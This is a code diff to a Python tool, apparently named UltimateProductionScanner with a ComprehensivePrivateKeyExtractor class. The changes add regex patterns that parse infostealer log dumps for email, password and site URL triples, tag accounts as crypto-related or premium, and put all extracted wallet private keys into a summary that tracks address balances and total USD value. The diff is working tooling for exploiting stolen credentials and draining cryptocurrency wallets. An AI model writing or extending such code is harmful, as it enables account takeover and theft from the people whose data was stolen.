@@ -851,7 +851,8 @@ class ComprehensivePrivateKeyExtractor:
             'keystore_keys': len(self.found_keys['keystore']),
             'total_addresses_derived': self.total_addresses,
             'addresses_with_balance': self.addresses_with_balance,
-            'total_usd_value': self.total_usd_value
+            'total_usd_value': self.total_usd_value,
+            'all_keys': self.found_keys  # FIX: Add all_keys to summary
         }
     
     def _extract_metamask_keys(self, content, source_file):
@@ -5707,6 +5708,47 @@ class UltimateProductionScanner:
                     'is_premium': self._is_premium_email(email)
                 })
         
+        # Pattern 1b: Alternative stealer format (Application/URL/Username/Password)
+        stealer_alt = r'(?:Application|URL):\s*([^\n]+).*?(?:Username|Login|Email):\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}).*?Password:\s*([^\n]+)'
+        stealer_alt_matches = re.findall(stealer_alt, content, re.IGNORECASE | re.MULTILINE | re.DOTALL)
+        for url, email, password in stealer_alt_matches:
+            password = password.strip()
+            if is_valid_password(password):
+                credentials.append({
+                    'email': email.strip(),
+                    'password': password,
+                    'url': url.strip(),
+                    'source_file': file_path,
+                    'category': self._categorize_email(email),
+                    'is_crypto': self._is_crypto_site(email),
+                    'is_premium': self._is_premium_email(email)
+                })
+        
+        # Pattern 1c: Extract URLs near credentials
+        url_near_cred = r'(?:https?://[^\s\n]+)\s+([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s+([^\s\n]{4,100})'
+        url_near_matches = re.findall(url_near_cred, content)
+        for url_match in re.finditer(r'(https?://[^\s\n]+)', content):
+            url = url_match.group(1)
+            # Look for email/password within 200 characters after URL
+            text_after = content[url_match.end():url_match.end()+200]
+            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text_after)
+            if email_match:
+                email = email_match.group(1)
+                # Look for password after email
+                pwd_match = re.search(r'(?:password|pass|pwd)[\s:=]+([^\s\n]{4,100})', text_after, re.IGNORECASE)
+                if pwd_match:
+                    password = pwd_match.group(1).strip()
+                    if is_valid_password(password):
+                        credentials.append({
+                            'email': email,
+                            'password': password,
+                            'url': url,
+                            'source_file': file_path,
+                            'category': self._categorize_email(email),
+                            'is_crypto': self._is_crypto_site(email),
+                            'is_premium': self._is_premium_email(email)
+                        })
+        
         # Pattern 2: email:password format
         pattern1 = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[\s:,;|]+([^\s\n]{4,100})'
         matches = re.findall(pattern1, content)
@@ -5752,9 +5794,19 @@ class UltimateProductionScanner:
                     'is_premium': self._is_premium_email(email)
                 })
         
-        # Pattern 5: Line-by-line (common in stealer logs)
+        # Pattern 5: Line-by-line (common in stealer logs) with URL extraction
         lines = content.split('\n')
         for i in range(len(lines) - 1):
+            # Extract URL from current or nearby lines
+            url = ''
+            for check_line in lines[max(0, i-2):i+1]:
+                url_match = re.search(r'(?:URL:\s*)?(?:https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[^\s]*)?)', check_line, re.IGNORECASE)
+                if url_match:
+                    url = url_match.group(0)
+                    if not url.startswith('http'):
+                        url = 'https://' + url
+                    break
+            
             # Check if line has email
             email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', lines[i])
             if email_match:
@@ -5770,7 +5822,7 @@ class UltimateProductionScanner:
                                 credentials.append({
                                     'email': email,
                                     'password': password,
-                                    'url': '',
+                                    'url': url,
                                     'source_file': file_path,
                                     'category': self._categorize_email(email),
                                     'is_crypto': self._is_crypto_site(email),
